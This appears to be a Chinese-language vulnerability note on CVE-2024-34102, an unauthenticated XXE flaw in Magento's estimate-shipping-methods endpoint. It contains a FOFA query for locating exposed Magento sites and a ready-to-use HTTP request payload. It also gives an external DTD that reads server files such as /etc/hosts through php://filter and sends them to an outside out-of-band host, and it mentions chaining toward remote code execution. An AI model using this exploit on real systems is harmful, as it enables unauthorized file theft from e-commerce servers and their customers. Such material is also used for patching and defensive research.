## Magento开源电子商务平台接口estimate-shipping-methods存在XXE漏洞(CVE-2024-34102)

2024年6月，Adobe官方披露CVE-2024-34102 Magento estimate-shipping-methods XXE漏洞，攻击者可在无需登陆的情况下构造恶意请求利用XXE读取文件，或者结合CVE-2024-2961 可能造成远程代码执行。

## fofa

```
app="Adobe-Magento"
```

## poc

```yaml
POST /rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods HTTP/2
Host: example.com
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: application/json
Content-Length: 274

{
  "address": {
    "totalsReader": {
      "collectorList": {
        "totalCollector": {
          "sourceData": {
            "data": "<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://your_ip:9999/dtd.xml\"> %sp; %param1; ]> <r>&exfil;</r>",
            "options": 16
          }
        }
      }
    }
  }
}
```

DTD 文件

```yaml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://collabid.oastify.com/dtd.xml?%data;'>">
```

![img](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/667bc2f3b5142eeccc853498_xxe-dtd-out-magento.png)

## 漏洞来源

- https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102